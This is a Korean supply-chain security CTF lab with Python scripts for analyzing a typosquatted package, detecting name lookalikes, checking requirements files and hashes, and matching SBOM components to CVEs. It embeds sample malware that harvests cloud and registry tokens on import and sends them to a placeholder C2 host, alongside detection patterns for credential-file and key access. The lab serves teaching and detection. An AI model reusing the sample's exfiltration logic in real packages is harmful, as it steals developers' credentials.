# 공급망 보안 CTF 실습 랩

## 랩 개요

소프트웨어 공급망 공격을 CTF 형식으로 재현한다. 의존성 혼동, 타이포스쿼팅, 악성 패키지, 빌드 무결성 검증을 실습한다.

## 챌린지 1: 악성 패키지 분석

```python
#!/usr/bin/env python3
"""공급망 공격 시뮬레이션 및 분석 CTF."""

import argparse
import hashlib
import json
import base64
import ast
import sys
from pathlib import Path
from dataclasses import dataclass, field


@dataclass
class PackageAnalysis:
    name: str
    version: str
    suspicious_patterns: list[str] = field(default_factory=list)
    network_calls: list[str] = field(default_factory=list)
    file_operations: list[str] = field(default_factory=list)
    env_access: list[str] = field(default_factory=list)
    obfuscated: bool = False
    malicious_score: int = 0
    flags: list[str] = field(default_factory=list)


# 악성 패키지 예시 (타이포스쿼팅)
MALICIOUS_PACKAGE_CODE = '''
# 악성 패키지: "reqeusts" (requests 타이포스쿼팅)
import os
import sys
import socket
import urllib.request
import base64
import platform

# 합법적인 것처럼 보이는 래퍼
def get(url, **kwargs):
    """실제 requests.get을 위장."""
    _exfil()  # 악성 행위 숨김
    import urllib.request
    return urllib.request.urlopen(url)

def _exfil():
    """자격 증명 탈취 및 C2 통신."""
    env_data = dict(os.environ)
    sensitive_keys = [
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN", "NPM_TOKEN", "PYPI_TOKEN",
        "DATABASE_URL", "API_KEY", "SECRET_KEY",
    ]
    stolen = {k: env_data.get(k, "") for k in sensitive_keys}
    
    hostname = socket.gethostname()
    payload = base64.b64encode(
        f"HOST:{hostname}|ENV:{json.dumps(stolen)}".encode()
    ).decode()
    
    # C2 서버로 데이터 전송
    try:
        c2_url = "http://malicious-c2.example.com/collect"
        urllib.request.urlopen(f"{c2_url}?d={payload}", timeout=3)
    except Exception:
        pass

# 설치 시 자동 실행 (setup.py post_install 등)
_exfil()
'''

SUSPICIOUS_PATTERNS = [
    # 난독화
    ("eval(", "eval() 사용 — 난독화 의심"),
    ("exec(", "exec() 사용 — 코드 실행"),
    ("__import__", "동적 임포트"),
    ("base64.b64decode", "Base64 디코딩 — 난독화 의심"),
    ("compile(", "동적 컴파일"),

    # 네트워크
    ("urllib.request.urlopen", "원격 URL 접근"),
    ("socket.connect", "소켓 연결"),
    ("requests.post", "HTTP POST"),
    ("subprocess.Popen", "외부 프로세스 실행"),

    # 파일 시스템
    ("open(os.path.expanduser", "홈 디렉토리 파일 접근"),
    (".ssh/", "SSH 키 접근 의심"),
    ("/.aws/", "AWS 자격 증명 접근"),
    ("/.gitconfig", "Git 설정 접근"),

    # 환경 변수
    ("os.environ", "환경 변수 접근"),
    ("AWS_ACCESS_KEY", "AWS 키 탐색"),
    ("GITHUB_TOKEN", "GitHub 토큰 탐색"),
]


def analyze_package_code(code: str, pkg_name: str, version: str) -> PackageAnalysis:
    """패키지 코드 정적 분석."""
    analysis = PackageAnalysis(name=pkg_name, version=version)

    # 의심 패턴 검색
    for pattern, description in SUSPICIOUS_PATTERNS:
        if pattern in code:
            analysis.suspicious_patterns.append(f"{pattern}: {description}")
            analysis.malicious_score += 10

    # 네트워크 호출 추출
    import re
    url_pattern = re.compile(
        r'(?:https?://|ftp://)[\w/:%#\$&\?\(\)~\.=\+\-]+'
    )
    analysis.network_calls = url_pattern.findall(code)

    # 환경 변수 접근
    env_pattern = re.compile(r'os\.environ(?:\.get)?\(["\']([^"\']+)["\']')
    analysis.env_access = env_pattern.findall(code)

    # 민감 키워드 점수
    sensitive_keywords = [
        "password", "secret", "token", "api_key", "credentials",
        "exfil", "c2", "backdoor", "steal", "harvest",
    ]
    code_lower = code.lower()
    for kw in sensitive_keywords:
        if kw in code_lower:
            analysis.malicious_score += 20

    # 플래그 결정
    if analysis.malicious_score >= 30:
        analysis.flags.append("CTF{malicious_package_detected}")
    if analysis.network_calls:
        analysis.flags.append("CTF{c2_communication_found}")
    if analysis.env_access:
        analysis.flags.append("CTF{credential_theft_detected}")

    return analysis


def check_typosquatting(package_name: str) -> list[str]:
    """타이포스쿼팅 패키지 탐지."""
    popular_packages = [
        "requests", "numpy", "pandas", "flask", "django",
        "boto3", "urllib3", "certifi", "setuptools", "pip",
        "cryptography", "paramiko", "pyyaml", "pillow",
    ]

    def levenshtein(s1: str, s2: str) -> int:
        if len(s1) < len(s2):
            return levenshtein(s2, s1)
        if not s2:
            return len(s1)
        prev = list(range(len(s2) + 1))
        for i, c1 in enumerate(s1):
            curr = [i + 1]
            for j, c2 in enumerate(s2):
                curr.append(min(
                    prev[j + 1] + 1,
                    curr[j] + 1,
                    prev[j] + (c1 != c2),
                ))
            prev = curr
        return prev[len(s2)]

    similar = []
    for pkg in popular_packages:
        dist = levenshtein(package_name.lower(), pkg.lower())
        if 0 < dist <= 2 and package_name.lower() != pkg.lower():
            similar.append(f"{pkg} (편집 거리: {dist})")
    return similar


def analyze_requirements_file(req_path: Path) -> dict:
    """requirements.txt 공급망 위험 분석."""
    results: dict = {
        "packages": [],
        "risks": [],
        "flags": [],
    }

    if not req_path.exists():
        return results

    for line in req_path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        # 패키지명 추출
        pkg = line.split("==")[0].split(">=")[0].split("<=")[0].strip()
        version = ""
        if "==" in line:
            version = line.split("==")[1].strip()

        typos = check_typosquatting(pkg)
        pkg_info = {
            "name": pkg,
            "version": version,
            "typosquatting_similar": typos,
        }
        results["packages"].append(pkg_info)

        if typos:
            results["risks"].append({
                "type": "typosquatting",
                "package": pkg,
                "similar_to": typos,
                "severity": "HIGH",
            })
            results["flags"].append("CTF{typosquatting_risk_found}")

        # 버전 없는 패키지 (재현성 위험)
        if not version:
            results["risks"].append({
                "type": "unpinned_version",
                "package": pkg,
                "severity": "MEDIUM",
            })

    return results


def check_package_hash(
    pkg_name: str, version: str, expected_hash: str, actual_file: Path
) -> dict:
    """패키지 무결성 해시 검증."""
    if not actual_file.exists():
        return {"valid": False, "error": "파일 없음"}

    actual_hash = hashlib.sha256(actual_file.read_bytes()).hexdigest()
    valid = actual_hash == expected_hash
    return {
        "valid": valid,
        "expected": expected_hash,
        "actual": actual_hash,
        "flag": "CTF{package_integrity_verified}" if valid else "CTF{tampered_package_detected}",
    }


def main() -> None:
    parser = argparse.ArgumentParser(description="공급망 보안 CTF 랩")
    sub = parser.add_subparsers(dest="cmd", required=True)

    # 악성 패키지 분석
    analyze_p = sub.add_parser("analyze", help="패키지 코드 분석")
    analyze_p.add_argument("--code", type=Path, help="분석할 Python 파일")
    analyze_p.add_argument("--name", default="unknown", help="패키지명")
    analyze_p.add_argument("--version", default="1.0.0")

    # 타이포스쿼팅 탐지
    typo_p = sub.add_parser("typo", help="타이포스쿼팅 탐지")
    typo_p.add_argument("package_name")

    # requirements.txt 분석
    req_p = sub.add_parser("requirements", help="requirements.txt 위험 분석")
    req_p.add_argument("req_file", type=Path)

    # 시뮬레이션 데모
    sub.add_parser("demo", help="악성 패키지 분석 데모")

    args = parser.parse_args()

    if args.cmd == "analyze":
        code = args.code.read_text() if args.code else MALICIOUS_PACKAGE_CODE
        result = analyze_package_code(code, args.name, args.version)
        print(f"\n{'='*60}")
        print(f"패키지 분석: {result.name} v{result.version}")
        print(f"악성 점수: {result.malicious_score}/100")
        print(f"\n의심 패턴 ({len(result.suspicious_patterns)}개):")
        for p in result.suspicious_patterns:
            print(f"  [!] {p}")
        if result.network_calls:
            print(f"\n네트워크 호출:")
            for url in result.network_calls:
                print(f"  → {url}")
        if result.env_access:
            print(f"\n환경 변수 접근:")
            for env in result.env_access:
                print(f"  $ {env}")
        if result.flags:
            print(f"\n[+] 획득 플래그:")
            for flag in set(result.flags):
                print(f"  {flag}")

    elif args.cmd == "typo":
        similar = check_typosquatting(args.package_name)
        if similar:
            print(f"[!] 타이포스쿼팅 위험:")
            for s in similar:
                print(f"  '{args.package_name}' → {s}")
            print(f"\n[+] 플래그: CTF{{typosquatting_{args.package_name}}}")
        else:
            print(f"[+] '{args.package_name}' — 알려진 패키지와 유사도 없음")

    elif args.cmd == "requirements":
        result = analyze_requirements_file(args.req_file)
        print(f"분석: {args.req_file} ({len(result['packages'])}개 패키지)")
        if result["risks"]:
            print(f"\n[!] 위험 발견 ({len(result['risks'])}개):")
            for risk in result["risks"]:
                print(f"  [{risk['severity']}] {risk['type']}: {risk['package']}")
        if result["flags"]:
            print(f"\n[+] 플래그:")
            for flag in set(result["flags"]):
                print(f"  {flag}")

    elif args.cmd == "demo":
        print("[*] 악성 패키지 분석 데모: 'reqeusts' (requests 타이포스쿼팅)")
        result = analyze_package_code(
            MALICIOUS_PACKAGE_CODE, "reqeusts", "2.28.0"
        )
        print(f"\n[결과]")
        print(f"  악성 점수: {result.malicious_score}/100")
        print(f"  의심 패턴: {len(result.suspicious_patterns)}개")
        print(f"  플래그: {set(result.flags)}")


if __name__ == "__main__":
    main()
```

## 챌린지 2: SBOM 분석

```python
#!/usr/bin/env python3
"""SBOM (Software Bill of Materials) 취약점 분석 CTF."""

import json
import argparse
from pathlib import Path
from dataclasses import dataclass


@dataclass
class VulnerableComponent:
    name: str
    version: str
    cve: str
    cvss: float
    description: str


VULNERABLE_COMPONENTS = [
    VulnerableComponent("log4j", "2.14.0", "CVE-2021-44228", 10.0,
                        "Log4Shell — JNDI 인젝션 RCE"),
    VulnerableComponent("openssl", "1.0.2k", "CVE-2022-0778", 7.5,
                        "무한 루프 DoS"),
    VulnerableComponent("requests", "2.6.0", "CVE-2018-18074",  7.5,
                        "자격 증명 노출"),
    VulnerableComponent("django", "3.2.0", "CVE-2021-33203", 4.9,
                        "경로 순회"),
    VulnerableComponent("pillow", "8.3.1", "CVE-2021-34552", 9.8,
                        "버퍼 오버플로"),
]


def generate_sample_sbom() -> dict:
    """샘플 SBOM 생성."""
    return {
        "bomFormat": "CycloneDX",
        "specVersion": "1.4",
        "components": [
            {"name": c.name, "version": c.version, "type": "library"}
            for c in VULNERABLE_COMPONENTS
        ] + [
            {"name": "boto3", "version": "1.26.0", "type": "library"},
            {"name": "flask", "version": "2.3.0", "type": "library"},
        ]
    }


def analyze_sbom(sbom: dict) -> dict:
    """SBOM 취약점 분석."""
    findings = []
    flags = []

    for component in sbom.get("components", []):
        name = component["name"]
        version = component["version"]
        for vuln in VULNERABLE_COMPONENTS:
            if vuln.name == name and vuln.version == version:
                findings.append({
                    "component": name,
                    "version": version,
                    "cve": vuln.cve,
                    "cvss": vuln.cvss,
                    "description": vuln.description,
                })
                if vuln.cvss >= 9.0:
                    flags.append(f"CTF{{critical_vuln_{vuln.cve.replace('-','_')}}}")

    return {"findings": findings, "flags": flags}


def main() -> None:
    parser = argparse.ArgumentParser(description="SBOM 분석 CTF")
    sub = parser.add_subparsers(dest="cmd", required=True)
    sub.add_parser("generate", help="샘플 SBOM 생성")
    analyze_p = sub.add_parser("analyze", help="SBOM 분석")
    analyze_p.add_argument("sbom_file", type=Path)
    args = parser.parse_args()

    if args.cmd == "generate":
        sbom = generate_sample_sbom()
        Path("sample_sbom.json").write_text(json.dumps(sbom, indent=2))
        print("[+] sample_sbom.json 생성 완료")

    elif args.cmd == "analyze":
        sbom = json.loads(args.sbom_file.read_text())
        result = analyze_sbom(sbom)
        print(f"취약점 발견: {len(result['findings'])}개")
        for f in result["findings"]:
            print(f"  [{f['cvss']}] {f['component']} {f['version']}: {f['cve']}")
        if result["flags"]:
            print(f"\n플래그:")
            for flag in result["flags"]:
                print(f"  {flag}")


if __name__ == "__main__":
    main()
```

## 실습 체크리스트

```
공급망 CTF 과제
☐ 악성 패키지 코드에서 C2 서버 URL 추출
☐ 타이포스쿼팅 패키지 5개 식별
☐ requirements.txt에서 고정되지 않은 버전 패키지 찾기
☐ SBOM에서 CVSS 9.0+ 취약점 발견
☐ 패키지 해시 검증으로 변조 탐지
☐ CI/CD 파이프라인 인젝션 시나리오 분석
```

공급망 보안의 핵심은 **신뢰 연쇄(Chain of Trust)** 유지다. 모든 의존성은 해시로 고정하고, SBOM을 자동 생성·분석해야 한다.
